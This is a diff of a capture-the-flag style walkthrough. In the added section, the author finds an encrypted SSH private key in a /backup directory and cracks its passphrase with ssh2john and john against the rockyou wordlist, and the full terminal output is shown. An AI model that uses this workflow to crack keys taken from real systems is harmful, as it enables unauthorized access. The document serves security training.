@@ -1,3 +1,6 @@
+<img width="1920" height="1080" alt="Screenshot at 2026-01-04 22-57-16" src="https://github.com/user-attachments/assets/4311c62a-9124-4d1c-8e96-94a0219ce45a" />
+
+
 I started by running an Nmap scan to see what services were exposed on the target machine. This helps understand the attack surface before diving deeper.
 
 First, I ran a standard scan with default scripts and version detection:
@@ -107,7 +110,54 @@ i found some intresting directory i try go watch what intresting i can here foun
 ![arc](https://github.com/user-attachments/assets/0963cf0c-0fb6-4a8f-aeeb-faeb3a21e3ca)
 
 ![Screenshot at 2026-01-04 22-49-01](https://github.com/user-attachments/assets/2e2e8d0a-ecb5-44dc-b919-497fa058bd80)
-now again it's return blank page,so i now go for /secret endpoint i am sure here we get somehint for next step
+now again it's return blank page,so i now go for others
+
+![Screenshot at 2026-01-04 23-01-54](https://github.com/user-attachments/assets/56e791eb-2aa7-4337-9817-644f2411b79b)
+
+
+While continuing directory enumeration, I discovered a `/backup` directory. Inside this directory, I found an SSH private key encoded.
+
+```text
+
+![Screenshot at 2026-01-04 22-55-55](https://github.com/user-attachments/assets/fb424ab8-cf07-4a82-81c3-c2a1b5f820e0)
+
+
+The key was encrypted, meaning a passphrase was required to use it. At this stage, the main challenge was identifying the correct username associated with the key and cracking the passphrase.
+so save it and crack it
+i used ssh2john to conver in hash so john can understand it for cracking
+and then i simple use john and i get id_rsa:letmein(passphrase key)
+
+```
+mrbunny $ nano id_rsa
+mrbunny $ ls
+cache  directory-disctory.txt  id_rsa  port-scan.txt
+mrbunny $ file id_rsa
+id_rsa: PEM RSA private key
+mrbunny $ ssh2john id_rsa > id_rsa.hash
+mrbunny $ ls
+cache  directory-disctory.txt  id_rsa  id_rsa.hash  port-scan.txt
+mrbunny $ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+letmein          (id_rsa)     
+1g 0:00:00:00 DONE (2026-01-04 23:15) 14.28g/s 7314p/s 7314c/s 7314C/s teiubesc..letmein
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+mrbunny $ john --show id_rsa.hash
+id_rsa:letmein
+
+1 password hash cracked, 0 left
+mrbunny $ 
+
+
+
+```
+
+
 
 
 
